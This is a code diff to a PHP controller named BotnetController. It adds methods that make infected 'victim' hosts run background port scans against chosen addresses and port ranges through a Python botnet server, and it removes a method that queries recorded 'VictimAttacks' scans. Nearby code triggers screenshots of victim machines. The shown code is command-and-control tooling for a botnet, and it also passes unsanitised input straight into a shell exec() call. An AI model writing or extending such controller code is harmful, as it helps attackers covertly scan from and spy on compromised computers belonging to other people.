@@ -178,6 +178,24 @@ class BotnetController extends Controller
         return $output;
     }
 
+    public function scanport($uid, $ip, $port1){
+        $path = env('PATH_PYTHON_EXECUTABLE');
+
+        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --scan --address ".$ip." --port-scan ".$port1." --host ".$uid." > /dev/null 2>&1 & echo $!";
+        exec($command, $output, $return);
+
+        return $output;
+    }
+
+    public function scanports($uid, $ip, $port1, $port2){
+        $path = env('PATH_PYTHON_EXECUTABLE');
+
+        $command = "nohup ".$path."PA-BOTNET-PYSRV/venv/bin/python3 ".$path."PA-BOTNET-PYSRV/main.py --scan --address ".$ip." --port-start ".$port1." --port-end ".$port2." --host ".$uid." > /dev/null 2>&1 & echo $!";
+        exec($command, $output, $return);
+
+        return $output;
+    }
+
     public function screenshot($uid){
         $path = env('PATH_PYTHON_EXECUTABLE');
 
@@ -203,27 +221,6 @@ class BotnetController extends Controller
         exec($command, $output, $return);
 
         return $output;
-    }
-    
-    public function get_scan($uid){
-        $recentScan = \App\Models\VictimAttacks::where('type', 'scan')
-                            ->where('state', 'done')
-                            ->latest('created_at')
-                            ->first();
-
-        dd($recentScan);
-    
-        if ($recentScan) {
-            return response()->json([
-                'success' => true,
-                'data' => $recentScan
-            ]);
-        } else {
-            return response()->json([
-                'success' => false,
-                'message' => 'No recent scans found'
-            ]);
-        }
     }
 
 }
